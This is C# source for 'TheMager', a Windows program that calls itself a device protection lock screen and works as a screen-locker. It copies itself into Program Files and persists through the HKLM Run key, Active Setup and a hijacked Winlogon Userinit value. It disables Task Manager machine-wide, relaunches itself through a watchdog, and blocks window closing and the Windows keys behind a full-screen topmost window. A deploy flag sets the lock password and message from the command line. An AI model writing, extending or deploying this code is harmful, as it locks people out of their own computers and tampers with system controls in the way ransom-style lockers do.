using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace TheMager
{
    public static class Program
    {
        public static string InstallDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "TheMager");
        public static string ExePath = Path.Combine(InstallDir, "TheMager.exe");
        public static string ConfigPath = Path.Combine(InstallDir, "lock_config.json");
        public static string PasswordFile = Path.Combine(InstallDir, "themager_pw.dat");

        [STAThread]
        public static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            bool doChange = false;
            bool doUninstall = false;
            bool doDeploy = false;
            string deployPw = null;
            string deployMsg = null;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "--change") doChange = true;
                else if (args[i] == "--uninstall") doUninstall = true;
                else if (args[i] == "--deploy") doDeploy = true;
                else if (args[i] == "--password" && i + 1 < args.Length) deployPw = args[++i];
                else if (args[i] == "--message" && i + 1 < args.Length) deployMsg = args[++i];
            }

            if (doUninstall) { Uninstall(); return; }
            if (doChange) { ChangePassword(PasswordFile); return; }

            if (doDeploy && deployPw != null)
            {
                File.WriteAllText(PasswordFile, Sha256(deployPw));
                if (deployMsg != null)
                {
                    try
                    {
                        string json = "{\"message\":\"" + deployMsg.Replace("\"", "\\\"") + "\"}";
                        File.WriteAllText(ConfigPath, json);
                    }
                    catch { }
                }
                InstallForAllUsers();
                LockScreen lockScreen = new LockScreen(PasswordFile, ConfigPath);
                Application.Run(lockScreen);
                return;
            }

            InstallForAllUsers();
            StartWatchdog();

            if (!File.Exists(PasswordFile))
            {
                SetupAndLock(PasswordFile, ConfigPath);
                return;
            }

            LockScreen ls = new LockScreen(PasswordFile, ConfigPath);
            Application.Run(ls);
        }

        static void InstallForAllUsers()
        {
            try
            {
                // Copy self to ProgramFiles (persists across reboots, all users)
                Directory.CreateDirectory(InstallDir);
                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
                if (!string.Equals(currentExe, ExePath, StringComparison.OrdinalIgnoreCase))
                {
                    for (int i = 0; i < 5; i++)
                    {
                        try { File.Copy(currentExe, ExePath, true); break; }
                        catch { Thread.Sleep(500); }
                    }
                    // Copy config too
                    string srcConfig = Path.Combine(Path.GetDirectoryName(currentExe), "lock_config.json");
                    if (File.Exists(srcConfig) && !File.Exists(ConfigPath))
                    {
                        try { File.Copy(srcConfig, ConfigPath, false); } catch { }
                    }
                }

                // 1. HKLM Run - runs for ALL users on login
                try
                {
                    RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    key.SetValue("TheMager", "\"" + ExePath + "\"");
                    key.Close();
                }
                catch { }

                // 2. Active Setup - runs for EACH user including NEW ones that haven't logged in yet
                try
                {
                    RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Active Setup\Installed Components\{TheMager}");
                    key.SetValue("StubPath", "\"" + ExePath + "\"", RegistryValueKind.String);
                    key.SetValue("Version", "1,0,0,0", RegistryValueKind.String);
                    key.SetValue("IsInstalled", 1, RegistryValueKind.DWord);
                    key.Close();
                }
                catch { }

                // 3. Userinit - runs before user desktop loads (bulletproof)
                try
                {
                    RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                    string userinit = key.GetValue("Userinit", "") as string;
                    string magerEntry = "\"" + ExePath + "\"";
                    if (userinit != null && !userinit.Contains("TheMager"))
                    {
                        // Append our exe after the default userinit.exe
                        string newUserinit = userinit.TrimEnd(',') + "," + magerEntry + ",";
                        key.SetValue("Userinit", newUserinit);
                    }
                    key.Close();
                }
                catch { }

                // 4. Disable Task Manager for all users
                try
                {
                    RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                    key.Close();
                }
                catch { }
            }
            catch { }
        }

        static void StartWatchdog()
        {
            // Watchdog thread: if TheMager.exe is killed, re-launch it
            new Thread(() =>
            {
                string myExe = Process.GetCurrentProcess().MainModule.FileName;
                while (true)
                {
                    Thread.Sleep(3000);
                    try
                    {
                        var procs = Process.GetProcessesByName("TheMager");
                        if (procs.Length == 0)
                        {
                            Process.Start(new ProcessStartInfo
                            {
                                FileName = myExe,
                                UseShellExecute = false,
                                WindowStyle = ProcessWindowStyle.Normal
                            });
                        }
                        foreach (var p in procs) p.Dispose();
                    }
                    catch { }
                }
            }) { IsBackground = true }.Start();
        }

        static void Uninstall()
        {
            try
            {
                // Kill watchdog first
                foreach (var p in Process.GetProcessesByName("TheMager"))
                    try { p.Kill(); } catch { }

                // Remove HKLM Run
                try { RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true); key.DeleteValue("TheMager", false); key.Close(); } catch { }
                // Remove Active Setup
                try { Registry.LocalMachine.DeleteSubKey(@"SOFTWARE\Microsoft\Active Setup\Installed Components\{TheMager}"); } catch { }
                // Remove from Userinit
                try
                {
                    RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                    string userinit = key.GetValue("Userinit", "") as string;
                    if (userinit != null && userinit.Contains("TheMager"))
                    {
                        string magerEntry = "\"" + ExePath + "\"";
                        userinit = userinit.Replace("," + magerEntry + ",", ",").Replace(magerEntry + ",", "");
                        key.SetValue("Userinit", userinit);
                    }
                    key.Close();
                } catch { }
                // Re-enable Task Manager
                try { RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"); key.DeleteValue("DisableTaskMgr", false); key.Close(); } catch { }
                // Remove per-user DisableTaskMgr
                try { RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"); key.DeleteValue("DisableTaskMgr", false); key.Close(); } catch { }
                // Delete files
                if (Directory.Exists(InstallDir)) Directory.Delete(InstallDir, true);
                MessageBox.Show("The Mager fully removed.", "The Mager", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex) { MessageBox.Show("Error: " + ex.Message, "The Mager", MessageBoxButtons.OK, MessageBoxIcon.Error); }
        }

        static void SetupAndLock(string passwordFile, string configPath)
        {
            Form setup = new Form { Text = "The Mager - Setup", Size = new System.Drawing.Size(420, 340), FormBorderStyle = FormBorderStyle.FixedDialog, MaximizeBox = false, MinimizeBox = false, StartPosition = FormStartPosition.CenterScreen, BackColor = System.Drawing.Color.FromArgb(30, 30, 30) };
            var title = new Label { Text = "THE MAGER", ForeColor = System.Drawing.Color.Cyan, Font = new System.Drawing.Font("Consolas", 20, System.Drawing.FontStyle.Bold), AutoSize = true, Location = new System.Drawing.Point(110, 20) };
            setup.Controls.Add(title);
            var subtitle = new Label { Text = "Set your lock password", ForeColor = System.Drawing.Color.White, Font = new System.Drawing.Font("Segoe UI", 11), AutoSize = true, Location = new System.Drawing.Point(120, 60) };
            setup.Controls.Add(subtitle);
            var pwLabel = new Label { Text = "Password:", ForeColor = System.Drawing.Color.White, Font = new System.Drawing.Font("Segoe UI", 10), Location = new System.Drawing.Point(40, 110) };
            setup.Controls.Add(pwLabel);
            var pwBox = new TextBox { UseSystemPasswordChar = true, Location = new System.Drawing.Point(40, 135), Size = new System.Drawing.Size(330, 25), Font = new System.Drawing.Font("Segoe UI", 11) };
            setup.Controls.Add(pwBox);
            var confirmLabel = new Label { Text = "Confirm:", ForeColor = System.Drawing.Color.White, Font = new System.Drawing.Font("Segoe UI", 10), Location = new System.Drawing.Point(40, 170) };
            setup.Controls.Add(confirmLabel);
            var confirmBox = new TextBox { UseSystemPasswordChar = true, Location = new System.Drawing.Point(40, 195), Size = new System.Drawing.Size(330, 25), Font = new System.Drawing.Font("Segoe UI", 11) };
            setup.Controls.Add(confirmBox);
            var msgLabel = new Label { ForeColor = System.Drawing.Color.Red, Font = new System.Drawing.Font("Segoe UI", 9), Location = new System.Drawing.Point(40, 225), Size = new System.Drawing.Size(330, 20) };
            setup.Controls.Add(msgLabel);
            var lockBtn = new Button { Text = "Set Password & Lock", BackColor = System.Drawing.Color.Cyan, ForeColor = System.Drawing.Color.Black, Font = new System.Drawing.Font("Segoe UI", 10, System.Drawing.FontStyle.Bold), Size = new System.Drawing.Size(150, 30), Location = new System.Drawing.Point(135, 270) };
            setup.Controls.Add(lockBtn);
            lockBtn.Click += delegate
            {
                if (pwBox.Text.Length < 4) { msgLabel.Text = "Password must be at least 4 characters"; return; }
                if (pwBox.Text != confirmBox.Text) { msgLabel.Text = "Passwords don't match"; return; }
                File.WriteAllText(passwordFile, Sha256(pwBox.Text));
                setup.Close();
                LockScreen lockScreen = new LockScreen(passwordFile, configPath);
                Application.Run(lockScreen);
            };
            Application.Run(setup);
        }

        static void ChangePassword(string passwordFile)
        {
            Form change = new Form { Text = "The Mager - Change Password", Size = new System.Drawing.Size(380, 250), FormBorderStyle = FormBorderStyle.FixedDialog, MaximizeBox = false, MinimizeBox = false, StartPosition = FormStartPosition.CenterScreen, BackColor = System.Drawing.Color.FromArgb(30, 30, 30) };
            var title = new Label { Text = "Change Password", ForeColor = System.Drawing.Color.Cyan, Font = new System.Drawing.Font("Consolas", 16, System.Drawing.FontStyle.Bold), AutoSize = true, Location = new System.Drawing.Point(80, 20) };
            change.Controls.Add(title);
            var curBox = new TextBox { UseSystemPasswordChar = true, Location = new System.Drawing.Point(40, 85), Size = new System.Drawing.Size(290, 25), Font = new System.Drawing.Font("Segoe UI", 11) };
            change.Controls.Add(curBox);
            var newBox = new TextBox { UseSystemPasswordChar = true, Location = new System.Drawing.Point(40, 135), Size = new System.Drawing.Size(290, 25), Font = new System.Drawing.Font("Segoe UI", 11) };
            change.Controls.Add(newBox);
            var msgLabel = new Label { ForeColor = System.Drawing.Color.Red, Font = new System.Drawing.Font("Segoe UI", 9), Location = new System.Drawing.Point(40, 165), Size = new System.Drawing.Size(290, 20) };
            change.Controls.Add(msgLabel);
            var btn = new Button { Text = "Change", BackColor = System.Drawing.Color.Cyan, ForeColor = System.Drawing.Color.Black, Font = new System.Drawing.Font("Segoe UI", 10, System.Drawing.FontStyle.Bold), Size = new System.Drawing.Size(290, 30), Location = new System.Drawing.Point(40, 190) };
            change.Controls.Add(btn);
            btn.Click += delegate
            {
                string storedHash = File.ReadAllText(passwordFile);
                if (Sha256(curBox.Text) != storedHash) { msgLabel.Text = "Current password is wrong"; return; }
                if (newBox.Text.Length < 4) { msgLabel.Text = "Min 4 characters"; return; }
                File.WriteAllText(passwordFile, Sha256(newBox.Text));
                MessageBox.Show("Password changed!", "The Mager", MessageBoxButtons.OK, MessageBoxIcon.Information);
                change.Close();
            };
            Application.Run(change);
        }

        public static string Sha256(string input)
        {
            using (SHA256 sha = SHA256.Create())
            {
                byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(input));
                StringBuilder sb = new StringBuilder();
                foreach (byte b in hash) sb.Append(b.ToString("x2"));
                return sb.ToString();
            }
        }
    }

    public class LockScreen : Form
    {
        string passwordFile;
        string configPath;
        int failedAttempts = 0;
        string lockMessage = "This device is protected by The Mager";
        delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        IntPtr hookId = IntPtr.Zero;
        LowLevelKeyboardProc hookProc;
        System.Windows.Forms.Timer focusTimer;
        System.Windows.Forms.Timer wifiTimer;

        public LockScreen(string pwFile, string cfgPath)
        {
            passwordFile = pwFile;
            configPath = cfgPath;
            try
            {
                if (File.Exists(cfgPath))
                {
                    string json = File.ReadAllText(cfgPath);
                    int idx = json.IndexOf("\"message\"");
                    if (idx >= 0)
                    {
                        int start = json.IndexOf("\"", idx + 9) + 1;
                        int end = json.IndexOf("\"", start);
                        if (start > 0 && end > start)
                            lockMessage = json.Substring(start, end - start).Replace("\\\"", "\"");
                    }
                }
            }
            catch { }

            // Disable Task Manager machine-wide
            try
            {
                RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch { }
            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch { }

            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;
            this.BackColor = System.Drawing.Color.Black;
            this.ShowInTaskbar = false;
            this.Cursor = Cursors.Arrow;

            System.Drawing.Rectangle virtualScreen = System.Drawing.Rectangle.Empty;
            foreach (Screen s in Screen.AllScreens)
                virtualScreen = System.Drawing.Rectangle.Union(virtualScreen, s.Bounds);
            this.StartPosition = FormStartPosition.Manual;
            this.Bounds = virtualScreen;

            int cx = Screen.PrimaryScreen.Bounds.X + (Screen.PrimaryScreen.Bounds.Width / 2);
            int cy = Screen.PrimaryScreen.Bounds.Y + 150;

            var title = new Label { Text = "THE MAGER", ForeColor = System.Drawing.Color.Cyan, Font = new System.Drawing.Font("Consolas", 36, System.Drawing.FontStyle.Bold), AutoSize = true };
            title.Location = new System.Drawing.Point(cx - (title.PreferredWidth / 2), cy);
            this.Controls.Add(title);

            var msg = new Label { Text = lockMessage, ForeColor = System.Drawing.Color.White, Font = new System.Drawing.Font("Segoe UI", 16), AutoSize = true };
            msg.Location = new System.Drawing.Point(cx - (msg.PreferredWidth / 2), cy + 80);
            this.Controls.Add(msg);

            var pwBox = new TextBox { UseSystemPasswordChar = true, Size = new System.Drawing.Size(300, 30), Font = new System.Drawing.Font("Segoe UI", 14), BackColor = System.Drawing.Color.FromArgb(50, 50, 50), ForeColor = System.Drawing.Color.White, TextAlign = HorizontalAlignment.Center };
            pwBox.Location = new System.Drawing.Point(cx - 150, cy + 170);
            this.Controls.Add(pwBox);

            var unlockBtn = new Button { Text = "UNLOCK", BackColor = System.Drawing.Color.Cyan, ForeColor = System.Drawing.Color.Black, Font = new System.Drawing.Font("Consolas", 14, System.Drawing.FontStyle.Bold), Size = new System.Drawing.Size(300, 40) };
            unlockBtn.Location = new System.Drawing.Point(cx - 150, cy + 215);
            this.Controls.Add(unlockBtn);

            var failLabel = new Label { ForeColor = System.Drawing.Color.Red, Font = new System.Drawing.Font("Segoe UI", 11), AutoSize = true };
            failLabel.Location = new System.Drawing.Point(cx - 100, cy + 270);
            this.Controls.Add(failLabel);

            EventHandler tryUnlock = delegate
            {
                if (pwBox.Text.Length == 0) return;
                string storedHash = File.ReadAllText(passwordFile);
                string inputHash = Program.Sha256(pwBox.Text);
                if (inputHash == storedHash) { Unlock(); }
                else { failedAttempts++; failLabel.Text = "Wrong password (" + failedAttempts + " attempts)"; pwBox.Text = ""; }
            };

            unlockBtn.Click += tryUnlock;
            pwBox.KeyDown += delegate(object sender, KeyEventArgs e) { if (e.KeyCode == Keys.Enter) tryUnlock(null, null); };

            // Block Win keys, Alt+F4, Alt+Tab, Ctrl+Esc
            hookProc = HookCallback;
            using (Process curProc = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProc.MainModule)
                hookId = SetWindowsHookEx(13, hookProc, GetModuleHandle(curModule.ModuleName), 0);

            focusTimer = new System.Windows.Forms.Timer();
            focusTimer.Interval = 200;
            focusTimer.Tick += delegate
            {
                if (!this.TopMost) this.TopMost = true;
                this.BringToFront();
                this.Activate();
            };
            focusTimer.Start();

            // WiFi watchdog: re-enable WiFi every 10s
            wifiTimer = new System.Windows.Forms.Timer();
            wifiTimer.Interval = 10000;
            wifiTimer.Tick += delegate
            {
                try { Process.Start(new ProcessStartInfo("netsh", "interface set interface \"Wi-Fi\" enable") { CreateNoWindow = true, UseShellExecute = false }); } catch { }
                try { Process.Start(new ProcessStartInfo("netsh", "interface set interface \"WLAN\" enable") { CreateNoWindow = true, UseShellExecute = false }); } catch { }
            };
            wifiTimer.Start();

            this.FormClosing += delegate(object sender, FormClosingEventArgs e) { e.Cancel = true; };
        }

        void Unlock()
        {
            // Re-enable Task Manager (it will be disabled again on next run via startup)
            try { RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"); key.DeleteValue("DisableTaskMgr", false); key.Close(); } catch { }
            try { RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"); key.DeleteValue("DisableTaskMgr", false); key.Close(); } catch { }

            if (hookId != IntPtr.Zero) UnhookWindowsHookEx(hookId);
            focusTimer.Stop();
            wifiTimer.Stop();
            this.FormClosing += delegate(object sender, FormClosingEventArgs e) { };
            this.Close();
            Application.Exit();
        }

        IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                // Block: Win (91/92), Alt+Tab (9), Alt+F4 (115->F4), Ctrl+Esc (27)
                if (vkCode == 91 || vkCode == 92) return (IntPtr)1;
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }
    }
}
